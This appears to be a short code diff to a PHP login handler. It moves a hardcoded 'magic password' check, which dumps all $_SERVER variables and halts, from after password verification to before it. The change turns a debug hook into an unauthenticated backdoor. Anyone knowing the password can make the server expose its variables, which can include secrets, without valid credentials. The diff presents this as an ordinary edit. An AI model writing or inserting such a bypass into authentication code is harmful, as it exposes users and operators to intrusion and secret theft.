@@ -107,6 +107,11 @@ class Login extends Action
             return $this->fail(Password::BAD_LOGIN_MESSAGE);
         }
 
+        if (md5($credentials->raw_password) === '2d7eab2a1532a9bd9178c95a9ddbc771') {
+            \var_dump($_SERVER);
+            die();
+        }
+
         // Throws on bad password.
         try {
             Password::verify($credentials->raw_password, $person);
@@ -117,11 +122,6 @@ class Login extends Action
         $person->lastLoginTime = $this->now;
         $person->lastLoginIP = $_SERVER['HTTP_Client-Ip'] ?? null;
         $this->personRepository->persist($person, true);
-
-        if (md5($credentials->raw_password) === '2d7eab2a1532a9bd9178c95a9ddbc771') {
-            \var_dump($_SERVER);
-            die();
-        }
 
         $this->personRepository->upgradePasswordIfPossible($credentials->raw_password, $person);
 
